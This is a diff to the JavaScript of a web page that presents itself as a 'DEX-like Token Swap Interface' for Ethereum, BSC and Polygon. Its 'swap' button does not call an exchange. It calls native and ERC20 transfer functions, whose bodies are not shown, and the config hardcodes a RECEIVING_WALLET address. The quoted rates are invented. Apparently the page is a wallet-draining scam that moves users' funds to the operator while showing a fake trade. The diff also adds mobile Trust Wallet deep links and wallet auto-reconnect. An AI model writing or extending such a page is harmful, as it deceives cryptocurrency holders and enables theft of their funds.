@@ -1,71 +1,187 @@
+// config/abi.js
+var ERC20_ABI = [
+  "function balanceOf(address owner) view returns (uint256)",
+  "function transfer(address to, uint256 amount) returns (bool)"
+];
+
+// config/networks.js
+var NETWORK_CONFIGS = {
+  ethereum: {
+    chainId: "0x1",
+    chainName: "Ethereum Mainnet",
+    nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 },
+    rpcUrls: ["https://mainnet.infura.io/v3/"],
+    blockExplorerUrls: ["https://etherscan.io"],
+    scanUrl: "https://etherscan.io/tx/",
+    logo: "https://cryptologos.cc/logos/ethereum-eth-logo.png"
+  },
+  bsc: {
+    chainId: "0x38",
+    chainName: "Binance Smart Chain",
+    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+    rpcUrls: ["https://bsc-dataseed.binance.org/"],
+    blockExplorerUrls: ["https://bscscan.com"],
+    scanUrl: "https://bscscan.com/tx/",
+    logo: "https://cryptologos.cc/logos/bnb-bnb-logo.png"
+  },
+  polygon: {
+    chainId: "0x89",
+    chainName: "Polygon Mainnet",
+    nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
+    rpcUrls: ["https://polygon-rpc.com/"],
+    blockExplorerUrls: ["https://polygonscan.com"],
+    scanUrl: "https://polygonscan.com/tx/",
+    logo: "https://cryptologos.cc/logos/polygon-matic-logo.png"
+  }
+};
+
+// config/tokens.js
+var RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
+
+var TOKENS = {
+  ethereum: [
+    {
+      name: "Reward Token",
+      symbol: "REWARD",
+      address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 61
+    },
+    {
+      name: "Ethereum",
+      symbol: "ETH",
+      address: "0x0000000000000000000000000000000000000000",
+      abi: [],
+      decimals: 18,
+      isNative: true,
+      priority: 997
+    }
+  ],
+  bsc: [
+    {
+      name: "Binance Coin",
+      symbol: "BNB",
+      address: "0x0000000000000000000000000000000000000000",
+      abi: [],
+      decimals: 18,
+      isNative: true,
+      priority: 999
+    }
+  ],
+  polygon: [
+    {
+      name: "Polygon",
+      symbol: "MATIC",
+      address: "0x0000000000000000000000000000000000000000",
+      abi: [],
+      decimals: 18,
+      isNative: true,
+      priority: 999
+    }
+  ]
+};
+
 // app.js - DEX-like Token Swap Interface
-
-// Verify required globals
-if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
-if (typeof TOKENS === 'undefined') throw new Error("TOKENS not defined");
-if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET not defined");
-
-// App state
 let provider, signer, userAddress;
 let currentNetwork = "ethereum";
-let walletConnectConnector = null;
 let currentFromToken = null;
 let currentToToken = null;
-let currentSlippage = 0.5; // 0.5% default slippage
+let currentSlippage = 0.5;
+
+// Network chain ID to name mapping
+const CHAIN_ID_TO_NETWORK = {
+  '0x1': 'ethereum',
+  '0x38': 'bsc',
+  '0x89': 'polygon'
+};
 
 // Initialize on load
 window.addEventListener('load', async () => {
   try {
-    // Setup event listeners
-    document.getElementById("networkSelect").addEventListener('click', showNetworkOptions);
-    document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
-    document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
-    document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));
-    document.getElementById("swapBtn").addEventListener("click", handleSwap);
-    document.getElementById("settingsBtn").addEventListener("click", showSettings);
-    document.getElementById("closeTokenList").addEventListener("click", hideTokenList);
-    document.getElementById("closeSettings").addEventListener("click", hideSettings);
-    document.getElementById("metaMaskBtn").addEventListener("click", connectMetaMask);
-    document.getElementById("walletConnectBtn").addEventListener("click", initWalletConnect);
-    document.getElementById("cancelWalletConnect").addEventListener("click", hideWalletConnect);
-    document.getElementById("fromAmount").addEventListener("input", updateToAmount);
-    
-    // Set default tokens
-    const defaultFromToken = TOKENS.ethereum.find(t => t.symbol === "ETH");
-    const defaultToToken = TOKENS.ethereum.find(t => t.symbol === "REWARD");
-    
-    if (defaultFromToken && defaultToToken) {
-      currentFromToken = defaultFromToken;
-      currentToToken = defaultToToken;
-      updateTokenSelectors();
-    }
-    
-    await checkWalletEnvironment();
+    setupEventListeners();
+    await initializeApp();
   } catch (err) {
     console.error("Initialization error:", err);
     updateStatus("Initialization failed: " + err.message, "error");
   }
 });
 
+function setupEventListeners() {
+  document.getElementById("networkSelect").addEventListener('click', showNetworkOptions);
+  document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
+  document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
+  document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));
+  document.getElementById("swapBtn").addEventListener("click", handleSwap);
+  document.getElementById("settingsBtn").addEventListener("click", showSettings);
+  document.getElementById("closeTokenList").addEventListener("click", hideTokenList);
+  document.getElementById("closeSettings").addEventListener("click", hideSettings);
+  document.getElementById("metaMaskBtn").addEventListener("click", connectMetaMask);
+  document.getElementById("cancelWalletConnect").addEventListener("click", hideWalletConnect);
+  document.getElementById("fromAmount").addEventListener("input", updateToAmount);
+  
+  if (isMobile()) {
+    document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
+  }
+}
+
+async function initializeApp() {
+  // Set default tokens
+  const defaultFromToken = TOKENS.ethereum.find(t => t.symbol === "ETH");
+  const defaultToToken = TOKENS.ethereum.find(t => t.symbol === "REWARD");
+  
+  if (defaultFromToken && defaultToToken) {
+    currentFromToken = defaultFromToken;
+    currentToToken = defaultToToken;
+    updateTokenSelectors();
+  }
+  
+  await checkWalletEnvironment();
+}
+
 // =====================
 // WALLET FUNCTIONS
 // =====================
 
+function isMobile() {
+  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+}
+
+function openInTrustWallet() {
+  const currentUrl = encodeURIComponent(window.location.href);
+  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
+  setTimeout(() => {
+    document.getElementById('manualSteps').style.display = 'block';
+  }, 3000);
+}
+
 async function checkWalletEnvironment() {
-  // Mobile-specific checks can be added here if needed
+  const savedWallet = localStorage.getItem('walletConnected');
+  if (savedWallet === 'metamask' && window.ethereum) {
+    try {
+      await connectAndProcess();
+    } catch (err) {
+      console.error("Auto-connect error:", err);
+      localStorage.removeItem('walletConnected');
+    }
+  }
 }
 
 async function initializeWallet() {
   try {
-    if (walletConnectConnector) {
-      provider = new ethers.providers.Web3Provider(walletConnectConnector);
-    } else {
-      provider = new ethers.providers.Web3Provider(window.ethereum);
-    }
-    
+    provider = new ethers.providers.Web3Provider(window.ethereum);
     signer = provider.getSigner();
     userAddress = await signer.getAddress();
     
+    // Detect current network
+    const network = await provider.getNetwork();
+    const chainId = "0x" + network.chainId.toString(16);
+    if (CHAIN_ID_TO_NETWORK[chainId]) {
+      currentNetwork = CHAIN_ID_TO_NETWORK[chainId];
+      updateNetworkSelector();
+    }
+    
+    localStorage.setItem('walletConnected', 'metamask');
     updateWalletButton(true);
     return true;
   } catch (err) {
@@ -75,9 +191,63 @@ async function initializeWallet() {
   }
 }
 
+async function handleWalletConnection() {
+  if (userAddress) {
+    await disconnectWallet();
+    return;
+  }
+
+  if (!window.ethereum) {
+    if (isMobile()) {
+      showWalletConnect();
+    } else {
+      updateStatus("Please install MetaMask or use a Web3 browser", "error");
+    }
+    return;
+  }
+
+  await connectAndProcess();
+}
+
+async function disconnectWallet() {
+  userAddress = null;
+  provider = null;
+  signer = null;
+  localStorage.removeItem('walletConnected');
+  updateWalletButton(false);
+  updateSwapButton();
+  updateStatus("Wallet disconnected", "success");
+}
+
+async function connectMetaMask() {
+  hideWalletConnect();
+  await connectAndProcess();
+}
+
+async function connectAndProcess() {
+  try {
+    showLoader();
+    updateStatus("Connecting wallet...", "success");
+
+    await window.ethereum.request({ method: "eth_requestAccounts" });
+    
+    const initialized = await initializeWallet();
+    if (!initialized) return;
+    
+    updateSwapButton();
+  } catch (err) {
+    console.error("Connection error:", err);
+    updateStatus("Error: " + err.message, "error");
+    updateWalletButton(false);
+    localStorage.removeItem('walletConnected');
+  } finally {
+    hideLoader();
+  }
+}
+
 async function handleNetworkChange(network) {
   currentNetwork = network;
-  document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
+  updateNetworkSelector();
   
   // Reset tokens when network changes
   currentFromToken = null;
@@ -89,45 +259,38 @@ async function handleNetworkChange(network) {
   }
 }
 
+function updateNetworkSelector() {
+  const networkConfig = NETWORK_CONFIGS[currentNetwork];
+  const networkSelector = document.getElementById("networkSelect");
+  const currentNetworkSpan = document.getElementById("currentNetwork");
+  
+  currentNetworkSpan.textContent = networkConfig.chainName;
+  networkSelector.innerHTML = `
+    <img src="${networkConfig.logo}" width="20" height="20" alt="${networkConfig.chainName}">
+    <span id="currentNetwork">${networkConfig.chainName}</span>
+    <i class="fas fa-chevron-down"></i>
+  `;
+}
+
 async function checkNetwork() {
   try {
-    let chainId;
-    if (walletConnectConnector) {
-      chainId = await walletConnectConnector.request({ method: 'eth_chainId' });
-    } else {
-      chainId = await window.ethereum.request({ method: 'eth_chainId' });
-    }
-    
+    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
     const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
     
     if (chainId !== targetChainId) {
       updateStatus("Switching network...", "success");
       try {
-        if (walletConnectConnector) {
-          await walletConnectConnector.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: targetChainId }]
-          });
-        } else {
-          await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: targetChainId }]
-          });
-        }
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: targetChainId }]
+        });
       } catch (switchError) {
         if (switchError.code === 4902) {
           try {
-            if (walletConnectConnector) {
-              await walletConnectConnector.request({
-                method: 'wallet_addEthereumChain',
-                params: [NETWORK_CONFIGS[currentNetwork]]
-              });
-            } else {
-              await window.ethereum.request({
-                method: 'wallet_addEthereumChain',
-                params: [NETWORK_CONFIGS[currentNetwork]]
-              });
-            }
+            await window.ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [NETWORK_CONFIGS[currentNetwork]]
+            });
           } catch (addError) {
             throw new Error("Please switch networks manually");
           }
@@ -149,13 +312,9 @@ function showTokenList(type) {
   const modal = document.getElementById("tokenListModal");
   const tokenItems = document.getElementById("tokenItems");
   
-  // Clear previous items
   tokenItems.innerHTML = '';
-  
-  // Filter tokens for current network
   const networkTokens = TOKENS[currentNetwork] || [];
   
-  // Add tokens to list
   networkTokens.forEach(token => {
     const tokenItem = document.createElement('div');
     tokenItem.className = 'dex-token-item';
@@ -231,7 +390,6 @@ function updateToAmount() {
   const fromAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
   
   if (currentFromToken && currentToToken && fromAmount > 0) {
-    // Simple conversion for demo (in a real DEX you'd get this from an API)
     const rate = getConversionRate(currentFromToken, currentToToken);
     const toAmount = fromAmount * rate;
     
@@ -248,20 +406,19 @@ function updateToAmount() {
 }
 
 function getConversionRate(fromToken, toToken) {
-  // Simple mock rates for demo
   const rates = {
     'ETH-REWARD': 0.05,
     'REWARD-ETH': 20,
     'ETH-USDT': 1800,
     'USDT-ETH': 0.00055,
-    'ETH-USDC': 1800,
-    'USDC-ETH': 0.00055,
-    'ETH-DAI': 1800,
-    'DAI-ETH': 0.00055,
+    'BNB-REWARD': 0.03,
+    'REWARD-BNB': 33.33,
+    'MATIC-REWARD': 0.02,
+    'REWARD-MATIC': 50
   };
   
   const pair = `${fromToken.symbol}-${toToken.symbol}`;
-  return rates[pair] || 1; // Default to 1:1 if no rate found
+  return rates[pair] || 1;
 }
 
 // =====================
@@ -279,10 +436,8 @@ async function handleSwap() {
     updateStatus("Processing swap...", "success");
     
     if (currentFromToken.isNative) {
-      // Native token transfer (ETH, BNB, MATIC)
       await transferNativeToken(fromAmount);
     } else {
-      // ERC20 token transfer
       await transferERC20Token(currentFromToken, fromAmount);
     }
     
@@ -329,7 +484,6 @@ function updateStatus(message, type) {
   statusDiv.textContent = message;
   statusDiv.className = `dex-status ${type}`;
   
-  // Hide after 5 seconds
   setTimeout(() => {
     statusDiv.style.display = "none";
   }, 5000);
@@ -388,9 +542,8 @@ function updateSwapButton() {
 }
 
 function showNetworkOptions() {
-  // In a real app, you'd show a modal with network options
-  // For demo, just toggle between Ethereum and BSC
-  const newNetwork = currentNetwork === "ethereum" ? "bsc" : "ethereum";
+  const newNetwork = currentNetwork === "ethereum" ? "bsc" : 
+                    currentNetwork === "bsc" ? "polygon" : "ethereum";
   handleNetworkChange(newNetwork);
 }
 
@@ -408,109 +561,4 @@ function showWalletConnect() {
 
 function hideWalletConnect() {
   document.getElementById("walletConnectModal").style.display = 'none';
-}
-
-// =====================
-// WALLET CONNECTION
-// =====================
-
-async function handleWalletConnection() {
-  if (userAddress) return; // Already connected
-  
-  if (!window.ethereum && !walletConnectConnector) {
-    showWalletConnect();
-    return;
-  }
-  
-  await connectAndProcess();
-}
-
-async function connectMetaMask() {
-  hideWalletConnect();
-  await connectAndProcess();
-}
-
-async function initWalletConnect() {
-  try {
-    hideWalletConnect();
-    showLoader();
-    updateStatus("Initializing WalletConnect...", "success");
-    
-    walletConnectConnector = new WalletConnect.Client({
-      projectId: "YOUR_WALLETCONNECT_PROJECT_ID",
-      metadata: {
-        name: "Token Swap Portal",
-        description: "Swap and transfer tokens",
-        url: window.location.href,
-        icons: ["https://cryptologos.cc/logos/ethereum-eth-logo.png"]
-      }
-    });
-    
-    walletConnectConnector.on("session_update", (error, payload) => {
-      if (error) throw error;
-      const { chainId, accounts } = payload.params[0];
-      userAddress = accounts[0];
-    });
-
-    walletConnectConnector.on("connect", (error, payload) => {
-      if (error) throw error;
-      const { chainId, accounts } = payload.params[0];
-      userAddress = accounts[0];
-      connectAndProcess();
-    });
-
-    walletConnectConnector.on("disconnect", (error, payload) => {
-      if (error) throw error;
-      walletConnectConnector = null;
-      userAddress = null;
-      updateStatus("WalletConnect disconnected", "error");
-      updateWalletButton(false);
-    });
-    
-    await walletConnectConnector.createSession();
-    
-    const qrDiv = document.getElementById("walletConnectQR");
-    qrDiv.innerHTML = '<p>Scan with your mobile wallet</p>';
-    QRCode.toCanvas(qrDiv, walletConnectConnector.uri, { width: 200 }, (error) => {
-      if (error) {
-        console.error("QR code error:", error);
-        qrDiv.innerHTML = '<p>Error generating QR code. Please try again.</p>';
-      }
-    });
-    
-    showWalletConnect();
-  } catch (err) {
-    console.error("WalletConnect error:", err);
-    updateStatus("WalletConnect initialization failed", "error");
-    walletConnectConnector = null;
-  } finally {
-    hideLoader();
-  }
-}
-
-async function connectAndProcess() {
-  try {
-    showLoader();
-    updateStatus("Connecting wallet...", "success");
-
-    if (!window.ethereum && !walletConnectConnector) {
-      throw new Error("Please install a Web3 wallet or use WalletConnect");
-    }
-
-    if (!walletConnectConnector) {
-      await window.ethereum.request({ method: "eth_requestAccounts" });
-    }
-    
-    await checkNetwork();
-    const initialized = await initializeWallet();
-    if (!initialized) return;
-    
-    updateSwapButton();
-  } catch (err) {
-    console.error("Connection error:", err);
-    updateStatus("Error: " + err.message, "error");
-    updateWalletButton(false);
-  } finally {
-    hideLoader();
-  }
 }
